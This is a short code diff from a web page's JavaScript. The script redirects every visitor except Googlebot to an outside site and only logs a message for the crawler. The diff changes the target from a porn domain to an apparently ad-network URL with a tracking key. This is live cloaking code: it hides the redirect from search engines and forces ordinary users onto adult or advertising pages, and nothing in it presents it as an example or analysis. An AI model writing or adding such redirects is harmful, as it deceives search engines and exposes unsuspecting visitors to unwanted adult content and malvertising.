@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://newporn.online/?id=div";
+  window.location.href = "https://www.profitableratecpmnetwork.com/zuytp6gt9?key=6b4cfc061e1fa61eecf7ba0e9491a0e5";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("THanks for visiting my page");
